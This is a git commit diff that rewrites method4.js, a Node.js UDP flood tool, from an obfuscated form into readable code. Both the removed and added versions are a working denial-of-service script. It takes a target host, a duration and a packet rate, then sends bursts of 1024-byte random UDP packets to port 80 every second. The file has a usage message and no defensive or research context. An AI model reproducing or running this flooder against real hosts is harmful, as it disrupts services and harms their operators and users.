bc7e4499dec3d2b9ea48bb8e3f7932fad2369784
M.Galih Pratama <kadal.rigel@gmail.com>
2025-07-06 08:57:14 +0700

    Update method4.js

--- method4.js
+++ method4.js
@@ -1,47 +1,28 @@
-(function(_0x小吴1, _0x小吴2) {
-    const _0x小吴3 = function(_0x小吴4) {
-        while (--_0x小吴4) {
-            _0x小吴1.push(_0x小吴1.shift());
-        }
-    };
-    _0x小吴3(++_0x小吴2);
-}(_0x小吴数组, 0x1f4));
+const 小吴dgram = require('dgram'), 小吴随机 = require('randomstring');
+const 小吴参数 = process.argv.slice(2);
 
-const _0x小吴解码 = function(_0x小吴5, _0x小吴6) {
-    _0x小吴5 = _0x小吴5 - 0x0;
-    return _0x小吴数组[_0x小吴5];
-};
-
-const 小吴套接字=require(_0x小吴解码('0x0'));
-const 小吴随机=require(_0x小吴解码('0x1'));
-
-const 小吴参数=process[_0x小吴解码('0x2')]['slice'](0x2);
-if(小吴参数['length']<0x3){
-    console[_0x小吴解码('0x3')](_0x小吴解码('0x4'));
-    process[_0x小吴解码('0x5')](-0x1);
+if (小吴参数.length < 3) {
+    console.log("Usage: node method4.js <host> <time> <rate>");
+    process.exit(-1);
 }
 
-const 小吴主机=小吴参数[0x0]['replace']('http://','')['replace']('https://','');
-const 小吴时间=parseInt(小吴参数[0x1]);
-const 小吴速率=parseInt(小吴参数[0x2]);
-const 小吴端口=0x50;
+const 小吴主机 = 小吴参数[0], 小吴时间 = parseInt(小吴参数[1]), 小吴速率 = parseInt(小吴参数[2]);
+const 小吴端口 = 80, 小吴客户端 = 小吴dgram.createSocket('udp4');
 
-console[_0x小吴解码('0x3')](`🔥 UDP Flood: ${小吴主机}:${小吴端口} | Duration: ${小吴时间}s | Rate: ${小吴速率} packets/s`);
+console.log(`🔥 UDP Flood ke ${小吴主机}:${小吴端口} selama ${小吴时间}s @ ${小吴速率} packet/s`);
 
-const 小吴客户端=小吴套接字['createSocket']('udp4');
-
-const 小吴间隔=setInterval(()=>{
-    for(let 小吴i=0x0;小吴i<小吴速率;小吴i++){
-        const 小吴消息=Buffer['from'](小吴随机['generate'](0x400));
-        小吴客户端['send'](小吴消息,0x0,小吴消息['length'],小吴端口,小吴主机,(小吴错误)=>{
-            if(小吴错误)console[_0x小吴解码('0x3')]("❌ UDP Error: "+小吴错误['message']);
-            else console[_0x小吴解码('0x3')]("📡 UDP Packet sent to "+小吴主机);
+const 小吴循环 = setInterval(() => {
+    for (let 小吴i = 0; 小吴i < 小吴速率; 小吴i++) {
+        const 小吴消息 = Buffer.from(小吴随机.generate(1024));
+        小吴客户端.send(小吴消息, 0, 小吴消息.length, 小吴端口, 小吴主机, (小吴错误) => {
+            if (小吴错误) console.log("❌ UDP 错误: " + 小吴错误.message);
+            else console.log(`📡 UDP Packet ke ${小吴主机}`);
         });
     }
-},0x3e8);
+}, 1000);
 
-setTimeout(()=>{
-    clearInterval(小吴间隔);
-    小吴客户端['close']();
-    console[_0x小吴解码('0x3')]("✅ UDP Flood selesai!");
-},小吴时间*0x3e8);
+setTimeout(() => {
+    clearInterval(小吴循环);
+    小吴客户端.close();
+    console.log("✅ UDP Flood 完成!");
+}, 小吴时间 * 1000);
